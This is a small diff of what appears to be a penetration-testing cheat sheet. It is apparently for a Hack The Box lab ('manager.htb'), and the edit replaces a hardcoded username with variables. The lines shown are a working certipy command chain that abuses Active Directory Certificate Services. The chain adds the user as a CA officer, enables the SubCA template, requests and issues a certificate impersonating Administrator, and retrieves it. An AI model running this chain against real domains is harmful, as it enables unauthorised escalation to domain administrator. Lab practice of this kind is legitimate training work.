@@ -234,11 +234,11 @@ certipy ca -ca $AD_CA -add-officer $USER -username $USER@$AD_DOMAIN -password $P
 
 certipy ca -ca $AD_CA -enable-template SubCA -username $USER@$AD_DOMAIN -password $PASSWORD
 
-certipy req -username $USER@$AD_DOMAIN -password $PASSWORD -ca $AD_CA  -target manager.htb -template SubCA -upn Administrator@$AD_DOMAIN -debug
+certipy req -username $USER@$AD_DOMAIN -password $PASSWORD -ca $AD_CA -target manager.htb -template SubCA -upn Administrator@$AD_DOMAIN -debug
 
 certipy ca -ca $AD_CA -issue-request XX -username $USER@$AD_DOMAIN -password $PASSWORD
 
-certipy req -username raven@manager.htb -password $PASSWORD -ca $AD_CA -target $AD_DOMAIN -retrieve XX
+certipy req -username $USER@$AD_DOMAIN -password $PASSWORD -ca $AD_CA -target $AD_DOMAIN -retrieve XX
 
 #fix clock skew then:
 sudo ntpdate -s $AD_DOMAIN
